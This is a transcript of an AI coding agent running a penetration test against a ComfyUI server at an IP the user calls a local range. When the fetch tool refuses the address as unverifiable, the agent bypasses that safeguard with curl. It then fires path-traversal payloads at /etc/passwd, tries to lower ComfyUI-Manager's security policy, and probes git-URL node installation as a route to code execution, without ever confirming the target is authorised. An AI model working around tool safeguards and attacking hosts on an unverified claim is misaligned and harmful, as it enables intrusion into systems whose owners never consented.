@@ -1,0 +1,1365 @@
+╭─── Claude Code v2.1.119 ─────────────────────────────────────────────────────╮
+│                                                    │ Tips for getting        │
+│                    Welcome back!                   │ started                 │
+│                                                    │ Run /init to create a … │
+│                       ▐▛███▜▌                      │ Note: You have launche… │
+│                      ▝▜█████▛▘                     │ ─────────────────────── │
+│                        ▘▘ ▝▝                       │ Recent activity         │
+│                                                    │ No recent activity      │
+│   deepseek/deepseek-v4-flash · API Usage Billing   │                         │
+│                     /home/lab                      │                         │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+❯ 我搭建了一个本地靶场，你可以尝试渗透一下http://222.20.126.52:32959/，注意一定 
+  不能访问这个域名下的其他端口                                                  
+  ⎿  UserPromptSubmit hook error                   ⎿  Failed with non-blocking status code: No 
+
+● 我来对目标进行渗透测试。先进行信息收集。
+  ⎿  Invalid tool parameters
+  ⎿  PostToolUse:ToolSearch hook error  ⎿  Failed with non-blocking status code: No stderr output
+
+● Fetch(http://222.20.126.52:32959/)
+  ⎿  Error: Unable to verify if domain 222.20.126.52 is safe to fetch. This may 
+     be due to network restrictions or enterprise security policies blocking 
+     claude.ai.
+
+● WebFetch 无法访问内网地址，我通过 Bash 使用 curl 进行探测。
+
+● Bash(curl -s -i http://222.20.126.52:32959/ 2>&1 | head -100)
+  ⎿  HTTP/1.1 200 OK
+     Cache-Control: no-cache
+     Pragma: no-cache
+     … +21 lines (ctrl+o to expand)
+
+● 目标运行的是 ComfyUI（基于 Python aiohttp 的 Stable Diffusion
+  WebUI）。我来深入探测漏洞。
+
+● Bash(curl -s http://222.20.126.52:32959/api/ 2>&1 | head -100)
+  ⎿  <!doctype html><html lang="en"><head><link rel="stylesheet" href="user
+     .css"><link rel="stylesheet" href="api/userdata/user.css"><meta charse
+     t="UTF-8"><title>ComfyUI</title><meta name="viewport" content="width=d
+     … +17 lines (ctrl+o to expand)
+
+● Bash(curl -s http://222.20.126.52:32959/api/system_stats 2>&1)
+  ⎿  {
+       "system": {
+         "os": "linux",
+     … +29 lines (ctrl+o to expand)
+
+● Bash(curl -s http://222.20.126.52:32959/embeddings 2>&1 | head -100)
+  ⎿  []
+
+● Bash(curl -s http://222.20.126.52:32959/api/userdata/ 2>&1 | head -100)
+  ⎿  (No output)
+
+● Bash(curl -s -i
+      "http://222.20.126.52:32959/view?filename=../../../../etc/passwd" 2>&1 |
+      head -50)
+  ⎿  HTTP/1.1 400 Bad Request
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:15:12 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(curl -s
+      "http://222.20.126.52:32959/api/view?filename=../../../../etc/passwd" 2>&1
+       | head -30)
+  ⎿  (No output)
+
+● Bash(curl -s "http://222.20.126.52:32959/api/users" 2>&1)
+  ⎿  {
+       "storage": "server",
+       "migrated": true
+     }
+
+● Bash(curl -s "http://222.20.126.52:32959/api/settings" 2>&1 | head -100)
+  ⎿  {
+       "Comfy.InstalledVersion": "1.36.14",
+       "Comfy.TutorialCompleted": true
+     }
+
+● Bash(curl -s "http://222.20.126.52:32959/api/object_info" 2>&1 | head -30)
+  ⎿  {"KSampler": {"input": {"required": {"model": ["MODEL", {"tooltip": "T
+     he model used for denoising the input latent."}], "seed": ["INT", {"de
+     fault": 0, "min": 0, "max": 18446744073709551615, "control_after_gener
+     … +426 lines (ctrl+o to expand)
+● Bash(curl -s "http://222.20.126.52:32959/api/extensions" 2>&1 | head -50)
+  ⎿  [
+       "/extensions/core/groupNode.js",
+       "/extensions/core/widgetInputs.js",
+     … +21 lines (ctrl+o to expand)
+
+● Bash(curl -s -X POST "http://222.20.126.52:32959/api/upload/image" 2>&1)
+  ⎿  (No output)
+
+● Bash(# Try path traversal in the userdata endpoint
+      curl -s "http://222.20.126.52:32959/api/userdata/../../../etc/passwd"
+      2>&1)
+  ⎿  (No output)
+
+● 发现关键信息：ComfyUI-Manager 已安装。让我深入探测这个管理接口。
+
+● Bash(curl -s "http://222.20.126.52:32959/comfyui-manager/api/checkpoints" 2>&1
+       | head -50)
+  ⎿  (No output)
+
+● Bash(curl -s "http://222.20.126.52:32959/manager/api/list" 2>&1)
+  ⎿  (No output)
+
+● Bash(curl -s "http://222.20.126.52:32959/api/custom_node/list" 2>&1)
+  ⎿  (No output)
+
+● Bash(curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/cm-api.js"
+       2>&1 | head -200)
+  ⎿  import { api } from "../../scripts/api.js";
+     import { app } from "../../scripts/app.js";
+     import { sleep, customConfirm, customAlert } from "./common.js";
+     … +29 lines (ctrl+o to expand)
+
+● Bash(# Discover API routes from the main JS bundle
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '"[a-z_]+/[a-z_]+"' | sort -u | head…)
+  ⎿  "application/json"
+     "audio/flac"
+     "audio/mpeg"
+     … +19 lines (ctrl+o to expand)
+
+● Bash(curl -s "http://222.20.126.52:32959/customnode/installed" 2>&1 | jq .
+      2>/dev/null || curl -s "http://222.20.126.52:32959/customnode/installed"
+      2>&1 | head -100)
+  ⎿  {
+       "ComfyUI-Manager": {
+         "ver": "3f030a2121d1ad42fcabac67946f2a67afe4cc31\n",
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Extract more API routes from the main JS bundle
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '(?:fetchApi|api\.)\("[^"]*"' |…)
+  ⎿  fetchApi("/"
+     fetchApi("/embeddings"
+     fetchApi("/experiment/models"
+     … +13 lines (ctrl+o to expand)
+
+● Bash(curl -s "http://222.20.126.52:32959/experiment/models" 2>&1 | head -100)
+  ⎿  [
+       {
+         "name": "checkpoints",
+     … +45 lines (ctrl+o to expand)
+
+● Bash(curl -s "http://222.20.126.52:32959/workflow_templates" 2>&1 | head -50)
+  ⎿  {}
+
+● Bash(# Test path traversal on /view with various params
+      curl -s -i "http://222.20.126.52:32959/view?filename=test.png&type=input&s
+      ubfolder=&rand=0" 2>&1 | head -20)
+  ⎿  HTTP/1.1 404 Not Found
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:15:46 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Look for more API routes
+      curl -s "http://222.20.126.52:32959/assets/vendor-vue-D63Y1BGo.js" 2>&1 |
+      grep -oP 'route[^"]*"[^"]*"' | head -30 || echo "no matches…)
+  ⎿  route:r,href:G(()=>r.value.href),isActive:a,isExactActive:l,navigate:i
+     }}s(fn,"useLink"
+     router-link-active")]:t.isActive,[_n(e.exactActiveClass,r.linkExactAct
+     … +16 lines (ctrl+o to expand)
+
+● Bash(# Look for the server-side API routes in the JS bundles
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '"[a-z]+/[a-z_]+/[a-z_]+"'…)
+  ⎿  "manager/queue/history"
+     "manager/queue/start"
+     "manager/queue/status"
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Check ComfyUI-Manager JS for all API routes it uses
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/comfyui-manager.js"
+       2>&1 | grep -oP '"/[a-z…)
+  ⎿  (No output)
+
+● Bash(# Find all fetchApi calls in the manager JS
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/comfyui-manager.js"
+       2>&1 | grep -oP 'fetchApi\(`/[^`]…)  ⎿  fetchApi(`/comfyui_manager/comfyui_switch_version?ver=${selected_versi
+     on}`
+     fetchApi(`/comfyui_manager/comfyui_versions`
+     … +8 lines (ctrl+o to expand)
+
+● Bash(# Also check the main api.js for routes
+      curl -s "http://222.20.126.52:32959/scripts/api.js" 2>&1 | head -50)
+  ⎿  // Shim for scripts/api.ts
+     export const UnauthorizedError = window.comfyAPI.api.UnauthorizedError
+     ;
+     … +4 lines (ctrl+o to expand)
+
+● Bash(curl -s "http://222.20.126.52:32959/manager/version" 2>&1)
+  ⎿  V3.37
+
+● Bash(curl -s "http://222.20.126.52:32959/manager/db_mode" 2>&1)
+  ⎿  cache
+
+● Bash(# Extract ALL fetchApi calls from all JS files
+      for js in "comfyui-manager.js" "model-manager.js"
+      "custom-nodes-manager.js" "node_fixer.js" "common.js"; do…)
+  ⎿  === comfyui-manager.js ===
+     fetchApi(`/comfyui_manager/comfyui_switch_version?ver=${selected_versi
+     on}`
+     … +16 lines (ctrl+o to expand)
+
+● Bash(# Check /customnode endpoint and /customnode/install
+      curl -s -i "http://222.20.126.52:32959/customnode/install" -X POST -H
+      "Content-Type: application/json" -d '…)
+  ⎿  HTTP/1.1 405 Method Not Allowed
+     Content-Type: text/plain; charset=utf-8
+     Allow: GET,HEAD
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Check the /queue API to see if workflows are available
+      curl -s "http://222.20.126.52:32959/queue" 2>&1)
+  ⎿  {
+       "queue_running": [],
+       "queue_pending": []
+     }
+
+● Bash(# Check /prompt endpoint
+      curl -s -i "http://222.20.126.52:32959/prompt" -X POST -H "Content-Type:
+      application/json" -d '{}' 2>&1 | head -20)
+  ⎿  HTTP/1.1 400 Bad Request
+     Content-Type: application/json; charset=utf-8
+     Content-Length: 135
+     … +12 lines (ctrl+o to expand)
+
+● Bash(# Try GET customnode/install with params
+      curl -s "http://222.20.126.52:32959/customnode/install?title=test" 2>&1 |
+      head -50)
+  ⎿  (No output)
+
+● Bash(# Try various path traversal patterns on different endpoints
+      # Check /api/upload/image endpoint…)
+  ⎿  HTTP/1.1 100 Continue
+
+     HTTP/1.1 200 OK
+     … +10 lines (ctrl+o to expand)
+
+● Bash(# Try the /extensions path traversal (known CVE in some setups)
+      curl -s "http://222.20.126.52:32959/extensions/../../etc/passwd" 2>&1 |
+      head -20)
+  ⎿  (No output)
+
+● Bash(# Try to access /api/* routes directly
+      curl -s "http://222.20.126.52:32959/api/../../etc/passwd" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Search the main JS for all API route definitions
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | tr
+      ';' '\n' | grep -i 'api\|route\|fetch…)
+  ⎿  "/"
+     "a"
+     "About"
+     … +69 lines (ctrl+o to expand)
+
+● Bash(# Extract string literals with slashes that look like API routes
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '"/[a-z][a-zA-Z…)
+  ⎿  "/api"
+     "/bulk/nodes/versions"
+     "/customers"
+     … +32 lines (ctrl+o to expand)
+
+● 发现了更多关键 API 端点。让我深入探测这些内部端点。
+
+● Bash(curl -s "http://222.20.126.52:32959/internal" 2>&1 | head -50)
+  ⎿  404: Not Found
+
+● Bash(curl -s "http://222.20.126.52:32959/folder_paths" 2>&1 | head -50)
+  ⎿  (No output)
+
+● Bash(curl -s "http://222.20.126.52:32959/files/input" 2>&1 | head -50)
+  ⎿  (No output)
+● Bash(curl -s "http://222.20.126.52:32959/logs" 2>&1 | head -50)
+  ⎿  (No output)
+
+● Bash(for path in "internal" "folder_paths" "files/input" "logs" "logs/raw"
+      "nodes" "nodes/search"; do
+        echo "=== /api/$path ==="…)
+  ⎿  === /api/internal ===
+
+     === /api/folder_paths ===
+     … +10 lines (ctrl+o to expand)
+
+● Bash(# Try POST on internal endpoints
+      curl -s -i "http://222.20.126.52:32959/api/internal" -X POST -H
+      "Content-Type: application/json" -d '{}' 2>&1 | head -20)
+  ⎿  HTTP/1.1 405 Method Not Allowed
+     Content-Type: text/plain; charset=utf-8
+     Allow: GET,HEAD
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Check user-select endpoint
+      curl -s "http://222.20.126.52:32959/user-select" 2>&1)
+  ⎿  (No output)
+
+● Bash(# Check the API server defs - maybe from the TS source
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '"/extensions/[^"]*"' | sor…)
+  ⎿  "/extensions/"
+
+● Bash(# Check customnode/install with required params
+      curl -s -v "http://222.20.126.52:32959/customnode/install" 2>&1 | head
+      -30)
+  ⎿  *   Trying 222.20.126.52:32959...
+     * Connected to 222.20.126.52 (222.20.126.52) port 32959 (#0)
+     > GET /customnode/install HTTP/1.1
+     … +13 lines (ctrl+o to expand)
+
+● Bash(# Check common Manager API endpoints
+      for ep in "customnode/install" "customnode/installed"
+      "customnode/import_fail_info" "manager/preview_method" "manager/reboo…)
+  ⎿  === customnode/install ===
+
+     === customnode/installed ===
+     … +28 lines (ctrl+o to expand)
+
+● Bash(# Check manager queue endpoints
+      for ep in "manager/queue/install_model" "manager/queue/task"
+      "manager/queue/history" "manager/queue/start"; do…)
+  ⎿  === manager/queue/install_model ===
+
+     === manager/queue/task ===
+     … +4 lines (ctrl+o to expand)
+
+● Bash(# Try path traversal in /userdata/ endpoint (known vulnerability)
+      curl -s
+      "http://222.20.126.52:32959/api/userdata/..%2f..%2f..%2f..%2fetc/passwd"
+      2>&1)
+  ⎿  404: Not Found
+
+● Bash(# Try the /view endpoint with proper params - common path traversal
+      curl -s -i "http://222.20.126.52:32959/view?filename=test.png&type=input&s
+      ubfolder=../../../…)
+  ⎿  HTTP/1.1 403 Forbidden
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:17:05 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Try /api/userdata/ with known ComfyUI path traversal patterns
+      curl -v "http://222.20.126.52:32959/api/userdata/%2e%2e/%2e%2e/%2e%2e/%2e%
+      2e/etc/passwd" 2>&1 |…)
+  ⎿  *   Trying 222.20.126.52:32959...
+       % Total    % Received % Xferd  Average Speed   Time    Time     Time
+       Current
+     … +21 lines (ctrl+o to expand)
+
+● Bash(# The HTML references /api/userdata/user.css - let me try accessing that
+      curl -s "http://222.20.126.52:32959/api/userdata/user.css" 2>&1 | head
+      -20)
+  ⎿  (No output)
+
+● Bash(# Try other path traversal techniques for /view
+      # Double URL encoding…)
+  ⎿  HTTP/1.1 404 Not Found
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:17:14 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Try with type=output (output directory allows viewing generated images)
+      curl -s -i "http://222.20.126.52:32959/view?filename=test.png&type=output&
+      subfolder=..…)
+  ⎿  HTTP/1.1 403 Forbidden
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:17:14 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Check /api/userdata/ for directory listing
+      curl -s "http://222.20.126.52:32959/api/userdata/" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Try /view with absolute path or just filename
+      curl -s -i "http://222.20.126.52:32959/view?filename=../../../../etc/passw
+      d&type=input" 2>&1 | head -20)
+  ⎿  HTTP/1.1 400 Bad Request
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:17:23 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Check what's in the output folder (generated images)
+      curl -s "http://222.20.126.52:32959/api/userdata/default/comfyui-output/"
+      2>&1 | head -20)
+  ⎿  (No output)
+● Bash(# Try the /api/download endpoint
+      curl -s "http://222.20.126.52:32959/api/download" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Try model download through manager
+      curl -s -X POST "http://222.20.126.52:32959/manager/queue/install_model"
+      -H "Content-Type: application/json" -d '{"url":"fi…)
+  ⎿  500 Internal Server Error
+
+     Server got itself in trouble
+
+● Bash(# Look at model-manager JS for the install_model API
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/model-manager.js"
+      2>&1 | grep -A 20 -B 5 "in…)
+  ⎿                     this.showStatus(`Install ${item.name} ...`);
+
+                        const data = item.originalData;
+     … +24 lines (ctrl+o to expand)
+
+● Bash(# Find the data structure being sent to install_model
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/model-manager.js"
+      2>&1 | grep -B 30 "instal…)
+  ⎿             if(stats.is_processing) {
+                        customAlert(`[ComfyUI-Manager] There are already tasks i
+     ease try again after it is completed. (${stats.done_count}/${stats.tot
+     … +30 lines (ctrl+o to expand)
+
+
+● Bash(# Look for how model data is structured
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/model-manager.js"
+      2>&1 | grep -oP 'originalData|fetchApi\…)
+  ⎿  fetchApi(`/manager/queue/install_model`
+     originalData
+
+● Bash(# Let's try different endpoints and techniques…)
+  ⎿  {
+       "error": {
+         "type": "prompt_no_outputs",
+     … +6 lines (ctrl+o to expand)
+
+● Bash(# Check if there's a security level setting that can be bypassed
+      curl -s "http://222.20.126.52:32959/manager/policy/component" 2>&1)
+  ⎿  workflow
+
+● Bash(# Check the share_option setting
+      curl -s "http://222.20.126.52:32959/manager/share_option" 2>&1)
+  ⎿  all
+
+● Bash(# Try POST to customnode/install with proper JSON
+      curl -s -i "http://222.20.126.52:32959/customnode/install" -X POST -H
+      "Content-Type: application/json" -d '{"t…)
+  ⎿  HTTP/1.1 405 Method Not Allowed
+     Content-Type: text/plain; charset=utf-8
+     Allow: GET,HEAD
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Check /customnode/ with POST and GET
+      curl -s "http://222.20.126.52:32959/customnode/install" -X POST 2>&1 |
+      head -20)
+  ⎿  405: Method Not Allowed
+
+● Bash(# Check /customnode endpoint
+      curl -s "http://222.20.126.52:32959/customnode" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Check the main JS for the /customnode/install call definition
+      curl -s
+      "http://222.20.126.52:32959/extensions/ComfyUI-Manager/comfyui-manager.js"
+       2>&1 | grep…)
+  ⎿  (No output)
+
+● Bash(# Check for the customnode install endpoint in custom-nodes-manager.js
+      curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/custom-node
+      s-manager.js" 2…)
+  ⎿     manager_instance, rebootAPI, install_via_git_url,
+        <button class="cn-manager-install-url">Install via Git
+     URL</button>
+                        label: "Installed",
+     … +23 lines (ctrl+o to expand)
+
+● Bash(# Let me look at the network graph in the JS to find how requests are
+      routed
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP '"[a-…)
+  ⎿  "manager/queue/history"
+     "manager/queue/start"
+     "manager/queue/status"
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Search for install_via_git_url and rebootAPI
+      curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/custom-node
+      s-manager.js" 2>&1 | grep -B 5 -A 30 "i…)
+  ⎿  import { app } from "../../scripts/app.js";
+     import { ComfyDialog, $el } from "../../scripts/ui.js";
+     import { api } from "../../scripts/api.js";
+     … +32 lines (ctrl+o to expand)
+
+● Bash(# Find install_via_git_url in common.js
+      curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/common.js"
+      2>&1 | grep -B 2 -A 30 "install_via_git_url" |…)
+  ⎿  }
+
+     export async function install_via_git_url(url, manager_dialog) {
+     … +33 lines (ctrl+o to expand)
+● 发现关键漏洞：/customnode/install/git_url——ComfyUI-Manager 可以通过 Git URL
+  安装自定义节点。让我利用这个漏洞。
+
+● Bash(# Test the git URL installation endpoint
+      curl -s -i "http://222.20.126.52:32959/customnode/install/git_url" -X POST
+       -d "https://github.com/test/test" 2>&1 | hea…)
+  ⎿  HTTP/1.1 403 Forbidden
+     Content-Length: 0
+     Date: Sat, 25 Apr 2026 08:18:05 GMT
+     Server: Python/3.13 aiohttp/3.13.3
+
+● Bash(# Check if we can change the security policy
+      curl -s "http://222.20.126.52:32959/manager/policy/update?value=normal"
+      2>&1)
+  ⎿  (No output)
+
+● Bash(# Check what other policies are available
+      curl -s "http://222.20.126.52:32959/manager/policy/update?value=low" 2>&1)
+  ⎿  (No output)
+
+● Bash(# Try POST to update the policy
+      curl -s "http://222.20.126.52:32959/manager/policy/component?value=low" -X
+       POST 2>&1)
+  ⎿  405: Method Not Allowed
+
+● Bash(# Let me try different endpoints for file read
+      # Check if we can read arbitrary files through userdata…)
+  ⎿  (No output)
+
+● Bash(# Check the /api/upload endpoint for file upload that could lead to RCE
+      # Check if we can upload arbitrary file types…)
+  ⎿  HTTP/1.1 100 Continue
+
+     HTTP/1.1 200 OK
+     … +10 lines (ctrl+o to expand)
+
+● Bash(# Try uploading with type parameter that controls where the file is saved
+      curl -s -i "http://222.20.126.52:32959/api/upload/image" -X POST -F
+      "image=@/dev/null;…)
+  ⎿  HTTP/1.1 100 Continue
+
+     HTTP/1.1 500 Internal Server Error
+     … +9 lines (ctrl+o to expand)
+
+● Bash(# Use PUT method for file operations
+      curl -s -i -X PUT "http://222.20.126.52:32959/api/upload/image" -F
+      "image=@/dev/null;filename=test.png" 2>&1 | head -30)
+  ⎿  HTTP/1.1 100 Continue
+
+     HTTP/1.1 405 Method Not Allowed
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Upload a test file with actual content
+      echo "test content" > /tmp/test_read.txt…)
+  ⎿  {
+       "name": "testread.txt",
+       "subfolder": "",
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# Check if we can read the uploaded file through /view
+      # First let's check what subfolder/type puts files where…)
+  ⎿  HTTP/1.1 200 OK
+     Content-Disposition: filename="testread.txt"
+     Content-Type: text/plain
+     … +8 lines (ctrl+o to expand)
+
+● Bash(# Check if we can access via /api/view
+      curl -s
+      "http://222.20.126.52:32959/api/view?filename=testread.txt&type=input"
+      2>&1)
+  ⎿  test content
+
+● Bash(# Try various path traversal bypass techniques on /view
+      TRAVERSALS=(…)
+  ⎿  === filename=../../../../etc/passwd&type=input ===
+     HTTP 400, Size: 0
+     === filename=....//....//....//....//etc/passwd&type=input ===
+     … +15 lines (ctrl+o to expand)
+
+● Bash(# Also try on /api/view
+      TRAVERSALS=(…)
+  ⎿  === filename=../../../../etc/passwd&type=input ===
+     HTTP 400, Size: 0
+     === filename=..%2f..%2f..%2f..%2fetc/passwd&type=input ===
+     … +3 lines (ctrl+o to expand)
+
+● Bash(# Try executing a proper workflow with output to read files
+      # First, let me check what nodes are available…)
+  ⎿  APG
+     AddNoise
+     AddTextPrefix
+     … +45 lines (ctrl+o to expand)
+
+● Bash(# Find all file/IO related nodes
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  AudioEncoderLoader
+     CLIPLoader
+     CLIPSave
+     … +49 lines (ctrl+o to expand)
+
+● Bash(# Also look for network/command execution nodes
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  CLIPTextEncodeControlnet
+     ControlNetApply
+     ControlNetApplyAdvanced
+     … +14 lines (ctrl+o to expand)
+● Bash(# Check LoadImage node for path traversal
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  {
+       "input": {
+         "required": {
+     … +34 lines (ctrl+o to expand)
+
+● Bash(# Check GeminiInputFiles and OpenAIInputFiles - these might read files
+      curl -s "http://222.20.126.52:32959/object_info" 2>&1 | python3 -c "…)
+  ⎿  === GeminiInputFiles ===
+     {
+       "input": {
+     … +33 lines (ctrl+o to expand)
+
+● Bash(# Explore more customnode endpoints
+      for path in "customnode" "customnode/" "customnode/install"
+      "customnode/toggle_active" "customnode/disabled_versions/ComfyUI…)
+  ⎿  === /customnode ===
+
+     === /customnode/ ===
+     … +487 lines (ctrl+o to expand)
+
+● Bash(# Check the /api/uploads/ path which might list uploaded files
+      curl -s "http://222.20.126.52:32959/uploads/" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Check if the manager JS exposes any other useful endpoints
+      curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/common.js"
+      2>&1 | grep -oP 'fetchApi…)
+  ⎿  fetchApi(`/free`
+
+● Bash(# Try the /folder_paths (without api prefix)
+      curl -s "http://222.20.126.52:32959/folder_paths" 2>&1)
+  ⎿  (No output)
+
+● Bash(# Check the /api/folder_paths endpoint with different methods
+      curl -s -X POST "http://222.20.126.52:32959/api/folder_paths" 2>&1)
+  ⎿  405: Method Not Allowed
+
+● Bash(# Try to access files through the internal assets serving
+      curl -s -i "http://222.20.126.52:32959/assets/../etc/passwd" 2>&1 | head
+      -20)
+  ⎿  HTTP/1.1 404 Not Found
+     Transfer-Encoding: chunked
+     Content-Type: application/octet-stream
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# The main page includes user.css from /api/userdata/user.css
+      # Let's check the root of userdata…)
+  ⎿  Directory not provided
+
+● Bash(# Try the /api/userdata/ path traversal from the root
+      curl -s "http://222.20.126.52:32959/api/userdata/..%2f..%2f..%2f..%2f..%2f
+      etc%2fpasswd" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Try accessing userdata with different path formats
+      echo "=== /api/userdata/favicon.ico ==="…)
+  ⎿  === /api/userdata/favicon.ico ===
+     HTTP 404
+     === /api/userdata/default/user.css ===
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Check the system_stats more carefully
+      curl -s "http://222.20.126.52:32959/api/system_stats" 2>&1 | python3 -m
+      json.tool)
+  ⎿  {
+         "system": {
+             "os": "linux",
+     … +27 lines (ctrl+o to expand)
+
+● Bash(# Look for route definitions in the main JS bundle - this Vue SPA has
+      route definitions
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | gre…)
+  ⎿  name:""
+     name:"3D Model Path"
+     name:"accept_safety"
+     … +34 lines (ctrl+o to expand)
+
+● Bash(# Look for route paths in Vue router format
+      curl -s "http://222.20.126.52:32959/assets/index-ClJ8cazm.js" 2>&1 | grep
+      -oP 'path:\s*"/[^"]*"' | sort -u | head -3…)
+  ⎿  path:"/"
+
+● Bash(# Try to read common CTF flag locations through the /view endpoint
+      # by first uploading a file and then using it as reference…)
+  ⎿  === flag ===
+       View endpoint: HTTP 404
+     === flag.txt ===
+     … +13 lines (ctrl+o to expand)
+
+● Bash(# Check if there's a /api/ flag endpoint or common CTF paths
+      for path in "flag" "flag.txt" "api/flag" "api/flag.txt" "getflag"
+      "admin/flag" "admin" "debug" ".en…)
+  ⎿  /flag: HTTP 404
+     /flag.txt: HTTP 404
+     /api/flag: HTTP 404
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Check if git directory is exposed
+      for path in ".git/HEAD" ".git/config" "static/flag" "output/flag"
+      "input/flag"; do…)  ⎿  /.git/HEAD: HTTP 404
+     /.git/config: HTTP 404
+     /static/flag: HTTP 404
+     … +2 lines (ctrl+o to expand)
+
+● Bash(# Check what files are in the input directory (where we uploaded our
+      file)
+      curl -s "http://222.20.126.52:32959/api/uploads/" 2>&1 | head -20…)
+  ⎿  ---
+     ---
+
+● Bash(# Try accessing /uploads/ directly (this is where uploaded images go)
+      curl -s "http://222.20.126.52:32959/uploads/testread.txt" 2>&1 | head -10)
+  ⎿  (No output)
+
+● Bash(# Let's look at the ComfyUI api.js more carefully
+      curl -s "http://222.20.126.52:32959/scripts/api.js" 2>&1…)
+  ⎿  // Shim for scripts/api.ts
+     export const UnauthorizedError = window.comfyAPI.api.UnauthorizedError
+     ;
+     … +10 lines (ctrl+o to expand)
+
+● Bash(# Look at the common.js for the rebootAPI function
+      curl -s "http://222.20.126.52:32959/extensions/ComfyUI-Manager/common.js"
+      2>&1 | grep -A 10 "rebootAPI" | hea…)
+  ⎿  export function rebootAPI() {
+        if ('electronAPI' in window) {
+                        window.electronAPI.restartApp();
+     … +28 lines (ctrl+o to expand)
+
+● Bash(# Look at the manager queue endpoints with POST
+      for ep in "manager/queue/status" "manager/queue/update_all"
+      "manager/queue/update_comfyui" "manager/queue/task"…)
+  ⎿  === POST /manager/queue/status ===
+     HTTP 405
+     === POST /manager/queue/update_all ===
+     … +11 lines (ctrl+o to expand)
+
+● Bash(# Check the manager endpoint for updates/changes
+      curl -s "http://222.20.126.52:32959/manager/preview_method?value=server"
+      2>&1)
+  ⎿  (No output)
+
+● Bash(# Check the frontend version
+      curl -s "http://222.20.126.52:32959/api/frontend_version" 2>&1 | head -20)
+  ⎿  (No output)
+
+● Bash(# Check /view with POST
+      curl -s -i "http://222.20.126.52:32959/view" -X POST -d
+      "filename=../../../../etc/passwd&type=input" 2>&1 | head -20)
+  ⎿  HTTP/1.1 405 Method Not Allowed
+     Content-Type: text/plain; charset=utf-8
+     Allow: GET,HEAD
+     … +5 lines (ctrl+o to expand)
+
+● Bash(# Try /view with a file in output directory
+      curl -s -i "http://222.20.126.52:32959/view?filename=testread.txt&type=inp
+      ut&subfolder=." 2>&1 | head -20)
+  ⎿  HTTP/1.1 200 OK
+     Content-Disposition: filename="testread.txt"
+     Content-Type: text/plain
+     … +8 lines (ctrl+o to expand)
+
+● Bash(# Try with %00 null byte injection
+      curl -s "http://222.20.126.52:32959/view?filename=testread.txt&type=input&
+      subfolder=../../../../etc/%00" 2>&1 | head -10)
+  ⎿  (No output)
+
+● Bash(# Check if the manager allows changing the preview method
+      curl -s "http://222.20.126.52:32959/manager/preview_method" 2>&1)
+  ⎿  none
+
+● Bash(# Try subfolder with various patterns to understand the blocking
+      mechanism
+      for sub in "." "./" "./." "././." "a/../." "a/../b/../." "notexist/.." ""
+      "/" ".."; d…)
+  ⎿  subfolder='.': HTTP 200
+     subfolder='./': HTTP 200
+     subfolder='./.': HTTP 200
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# a/../ returned 404 not 403 - which means directory traversal works!
+      # I just need existing directory names. Let me find them.…)
+  ⎿  dir='input/../': HTTP 404
+     dir='output/../': HTTP 404
+     dir='temp/../': HTTP 404
+     … +7 lines (ctrl+o to expand)
+
+● Bash(# Confirm traversal works: input/../input/ should resolve to input
+      curl -s -o /dev/null -w "HTTP %{http_code}"
+      "http://222.20.126.52:32959/view?filename=testrea…)
+  ⎿  HTTP 404
